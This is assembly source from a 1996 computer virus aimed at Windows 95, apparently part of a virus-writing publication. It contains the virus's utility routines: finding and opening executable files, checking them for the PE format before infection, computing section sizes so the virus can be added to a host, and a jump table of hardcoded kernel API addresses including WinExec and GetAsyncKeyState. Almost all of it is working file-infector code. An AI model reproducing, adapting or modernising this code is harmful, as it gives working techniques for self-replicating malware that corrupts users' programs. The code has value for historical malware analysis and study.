;(C) 1996 American Eagle Publications, Inc. All rights reserved.
;******************************************************************************
;Various simple utility functions used by the virus.

;This routine is passed an RVA for the file and it returns a file pointer in
;eax that corresponds to the address in the EXE file where that RVA is located.
RVA_TO_FILEPTR:
        xor     ecx,ecx
        mov     cx,[ebp+esi+6]          ;get section count
RTF1:   dec     ecx
        push    eax
        call    GET_SEC_PTR             ;get pointer to section header
        pop     eax
        cmp     eax,[ebp+ebx+12]        ;check virtual @ of this section
        jnc     RTF2                    ;if eax>=rva of section, then this is proper section
        or      ecx,ecx                 ;section number 0?
        jnz     RTF1                    ;no, check next section
        xor     eax,eax
        ret                             ;return with error
RTF2:   sub     eax,[ebp+ebx+12]        ;eax = distance from start of section
        add     eax,[ebp+ebx+20]        ;add distance to start of section
        ret

;This routine takes a section number in ecx and returns a pointer to be used
;with ebp in ebx that points to the start of the section header for the
;requested section. (e.g. mov eax,[ebp+ebx] would get first 4 chars of section
;name.) It assumes that esi points to the PE header
GET_SEC_PTR:
        mov     eax,SEC_SIZE
        mul     ecx                     ;eax=pointer to start of section hdr ecx
        add     eax,PE_SIZE             ;    from end of PE header
        add     eax,esi
        mov     ebx,eax                 ;ebp+ebx points to section header
        ret

;This seeks in the file with handle FHANDLE to the location eax from the
;beginning.
FILE_SEEK:
        push    LARGE 0                 ;FILE_BEGIN move method
        push    LARGE 0                 ;High DWORD of location is 0
        push    eax                     ;Low DWORD of location to move to
        push    DWORD PTR [ebp+FHANDLE] ;handle
        call    DWORD PTR [edi+SET_FILE_PTR]
        ret

;This routine writes ecx bytes to the file whose handle is in FHANDLE.
;The data is written from the buffer pointed to by edx.
FILE_WRITE:
        push    LARGE 0         ;overlapping data structure (irrelevant)
        lea     eax,[ebp+IOBYTES]
        push    eax             ;address of bytes read
        push    ecx             ;bytes to read
        push    edx             ;buffer to read data into
        push    DWORD PTR [ebp+FHANDLE]   ;file handle
        call    DWORD PTR [edi+OFFSET WRITE_FILE]
        or      eax,eax         ;set z if read failed
        ret

;This routine reads ecx bytes from the file whose handle is in FHANDLE.
;The data is put in the buffer pointed to by edx.
FILE_READ:
        push    LARGE 0         ;overlapping data structure (irrelevant)
        lea     eax,[ebp+IOBYTES]
        push    eax             ;address of bytes read
        push    ecx             ;bytes to read
        push    edx             ;buffer to read data into
        push    DWORD PTR [ebp+FHANDLE]   ;file handle
        call    DWORD PTR [edi+OFFSET READ_FILE]
        or      eax,eax         ;set z if read failed
        ret

;This checks the opened file with handle in FHANDLE to see if it is a PE-style
;executable or not. If not, it returns with NZ set, otherwise Z is set.
IS_PE_FILE:
        mov     ecx,FB_SIZE             ;read FB_SIZE bytes
        lea     edx,[ebp+HDRBUF ]       ;into this buffer
        call    FILE_READ               ;read file header information
        jz      IPEX                    ;exit on error

        cmp     BYTE PTR [ebp+HDRBUF +18H],40H  ;valid extended header?
        jc      IPEX
        mov     ax,[ebp+HDRBUF +3CH]        ;now find the PE header
        cmp     ax,FB_SIZE
        jge     IPEX
        cwde                            ;eax = offset into header where PE header starts
        mov     esi,HDRBUF
        add     esi,eax                 ;ebp+esi points to PE header
        mov     eax,[ebp+esi]           ;eax = PE header signature
        cmp     eax,'EP'                ;proper PE header?
        jne     IPEX                    ;nope, don't attempt to infect
        ret
IPEX:   mov     al,1
        or      al,al                   ;return with with nz set
        ret

;This routine opens a file found by FIND_FIRST_EXE.
OPEN_FILE:
        xor     eax,eax                 ;we need to push a bunch of 0 dwords
        push    eax                     ;and this is most efficient here
        push    eax                     ;FATTR_NORMAL
        push    LARGE OPEN_EXISTING
        push    eax
        push    eax
        push    LARGE GENERIC_READ or GENERIC_WRITE
        lea     eax,[ebp+FIND_DATA+44]  ;file name from search structure
        push    eax
        call    DWORD PTR [edi+CREATE_FILE]
        cmp     eax,-1                  ;was file opened successfully?
        ret

;This routine takes the difference between memory and file space into account
;when making a memory size calculation. If the additional memory required by
;the virus is zero, it returns zero.
GET_VMSIZE:
        push    ecx
        mov     eax,[ebp+OLD_RAW]       ;get original host SizeOfRawData
        mov     ecx,eax
        call    GET_MSIZE               ;convert it to an MSIZE
        sub     eax,ecx                 ;memory space available in section
        mov     ecx,eax
        mov     eax,VIR_SIZE
        call    GET_FSIZE               ;eax=virus size, in file blocks
        sub     eax,ecx                 ;virtual size requirement
        jnc     GVM1                    ;if eax>0 leave it alone
        xor     eax,eax                 ;else set eax=0
GVM1:   call    GET_MSIZE               ;turn it into a memory size
        pop     ecx
        ret


;This routine takes the value in eax and rounds it up to the next memory
;allocation unit size. It preserves all registers.
GET_MSIZE:
        push    ecx
        push    edx
        mov     ecx,[ebp+esi+56]        ;get SectionAlignment
        add     eax,ecx
        dec     eax                     ;eax=X+SectionAlignment+1
        xor     edx,edx
        div     ecx                     ;eax=(X+SectionAlignment+1)/SectionAlignment
        mul     ecx                     ;eax=desired result
        pop     edx
        pop     ecx
        ret

;This routine takes the value in eax and rounds it up to the next file
;allocation unit size. It preserves all registers.
GET_FSIZE:
        push    ecx
        push    edx
        mov     ecx,[ebp+esi+60]        ;get FileAlignment
        add     eax,ecx
        dec     eax                     ;eax=X+SectionAlignment+1
        xor     edx,edx
        div     ecx                     ;eax=(X+SectionAlignment+1)/SectionAlignment
        mul     ecx                     ;eax=desired result
        pop     edx
        pop     ecx
        ret

CODE_SEC        EQU     00000020H       ;Flag values for section header
EXECUTABLE      EQU     20000000H
READABLE        EQU     40000000H

;The folowing defines locate the API calls which the virus uses in 32-bit
;memory. The assigned values are the actual addresses of these routines in
;memory in the first general release of Windows 95. They are determined
;experimentally with a debugger, single stepping through ordinary calls.
;THE FOLLOWING VALUES ARE VALID FOR WINDOWS 95 VERSION 4.00.950
;(Uncomment them to use)
FIND_FIRST      EQU     0BFF77893H      ;@FindFirstFileA
FIND_NEXT       EQU     0BFF778CBH      ;@FindNextFileA
CREATE          EQU     0BFF77817H      ;@CreateFileA
CLOSE_FILE      EQU     0BFF7BC72H      ;@CloseHandle
SET_FP          EQU     0BFF76FA0H      ;@SetFilePointer
READFILE        EQU     0BFF75806H      ;@ReadFile
WRITEFILE       EQU     0BFF7580DH      ;@WriteFile
WINEXEC         EQU     0BFF9CFE8H      ;@WinExec
GETASYNCKEYSTATE        EQU 0BFF623B1H            ;@GetAsyncKeyState

;THE FOLLOWING VALUES ARE VALID FOR WINDOWS 95 VERSION 4.00.1111
;FIND_FIRST      EQU     0BFF77A18H      ;@FindFirstFileA
;FIND_NEXT       EQU     0BFF77A50H      ;@FindNextFileA
;CREATE          EQU     0BFF7799CH      ;@CreateFileA
;CLOSE_FILE      EQU     0BFF7BC8BH      ;@CloseHandle
;SET_FP          EQU     0BFF770E4H      ;@SetFilePointer
;READFILE        EQU     0BFF7594AH      ;@ReadFile
;WRITEFILE       EQU     0BFF75951H      ;@WriteFile
;WINEXEC         EQU                     ;@WinExec

;The following are a jump table for the virus to call the Win 95 Kernel.
FIND_FIRST_FILE DD      FIND_FIRST
FIND_NEXT_FILE  DD      FIND_NEXT
CREATE_FILE     DD      CREATE
LCLOSE          DD      CLOSE_FILE
SET_FILE_PTR    DD      SET_FP
READ_FILE       DD      READFILE
WRITE_FILE      DD      WRITEFILE
WIN_EXEC        DD      WINEXEC
GET_ASYNC_KEY_STATE     DD      GETASYNCKEYSTATE
